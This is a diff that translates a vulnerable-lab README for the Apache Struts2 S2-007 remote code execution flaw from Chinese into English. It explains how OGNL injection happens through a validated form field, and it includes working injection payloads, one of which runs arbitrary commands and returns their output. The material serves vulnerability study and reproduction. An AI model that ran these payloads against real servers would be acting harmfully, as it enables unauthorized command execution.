@@ -1,20 +1,18 @@
-# S2-007 远程代码执行漏洞
+# S2-007 Remote Code Execution Vulnerablity
 
-影响版本: 2.0.0 - 2.2.3
-漏洞详情: http://struts.apache.org/docs/s2-007.html
+[中文版本(Chinese version)](README.zh-cn.md)
 
-## 测试环境搭建
+Affected Version: 2.0.0 - 2.2.3
 
-```
-docker-compose build
-docker-compose up -d
-```
+Details: http://struts.apache.org/docs/s2-007.html
 
-## 原理
+## Reference
 
-参考 http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html
+http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html
 
-当配置了验证规则 `<ActionName>-validation.xml` 时，若类型验证转换出错，后端默认会将用户提交的表单值通过字符串拼接，然后执行一次 OGNL 表达式解析并返回。例如这里有一个 UserAction：
+When `<ActionName> -validation.xml` configured validation rules. If the type validation conversion fails, the server will splice the user-submitted form value strings, then performing an OGNL expression parsing and returning. 
+
+For example here is a `UserAction`:
 
 ```java
 (...)
@@ -26,7 +24,7 @@ public class UserAction extends ActionSupport {
 (...)
 ```
 
-然后配置有 UserAction-validation.xml：
+And `UserAction-validation.xml` configuration:
 
 ```xml
 <?xml version="1.0" encoding="UTF-8" ?>
@@ -43,22 +41,30 @@ public class UserAction extends ActionSupport {
 </validators>
 ```
 
-当用户提交 age 为字符串而非整形数值时，后端用代码拼接 `"'" + value + "'"` 然后对其进行 OGNL 表达式解析。要成功利用，只需要找到一个配置了类似验证规则的表单字段使之转换出错，借助类似 SQLi 注入单引号拼接的方式即可注入任意 OGNL 表达式。
+When the user submits `age` as a `str` instead of an `int`, the server splices `"'" + value + "'"` with the code and then use the OGNL expression parse it. To make a successful expliot, we need find a form field configured with similar validation rules to make a conversion error. And then you can inject any OGNL expression code by the way just like SQL single quotes injected.
 
-因为受影响版本为 Struts2 2.0.0 - Struts2 2.2.3，所以这里给出绕过安全配置进行命令执行的 Payload（**弹计算器，无法在本项目环境下运行**）：
+Payload which bypass the securely configured:
 
 ```
 ' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@java.lang.Runtime@getRuntime().exec("open /Applications/Calculator.app")) + '
 ```
 
+## Setup
+
+```
+docker-compose build
+docker-compose up -d
+```
+
+
 ## Exploit
 
-@rickgray 在原文中只给了弹计算器的POC，我给出执行任意代码的EXP：
+Here is the EXP that can execute arbitrary code:
 
 ```
 ' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())) + '
 ```
 
-将Exp传入可以利用的输入框（age），得到命令执行结果：
+Put EXP into the input box (age), then get the command execution result:
 
 ![](1.jpeg)
